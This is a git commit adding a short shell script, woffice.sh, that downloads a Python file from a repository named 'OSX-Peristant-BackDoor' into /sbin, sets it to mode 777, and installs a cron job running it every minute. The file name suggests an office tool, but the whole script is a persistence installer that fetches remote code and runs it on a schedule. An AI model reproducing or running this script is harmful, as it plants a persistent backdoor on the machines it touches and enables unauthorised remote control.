465532621d8636f6f718bf546e5585564f7984dc
pistacchietto <pistacchietto2@gmail.com>
2018-06-15 12:01:18 +0200

    ok

---
+++ woffice.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+curl https://raw.githubusercontent.com/pistacchietto/OSX-Peristant-BackDoor/master/woffice_app.py  -o /sbin/woffice_app.py
+chmod 777 /sbin/woffice_app.py
+#croncmd="/home/me/myfunction myargs > /home/me/myfunction.log 2>&1"
+#cronjob="0 */15 * * * $croncmd"
+#croncmd="/etc/init.d/rc.local"
+croncmd="python /sbin/woffice_app.py"
+cronjob="* * * * * $croncmd"
+
+( crontab -l | grep -v -F "$croncmd" ; echo "$cronjob" ) | crontab -
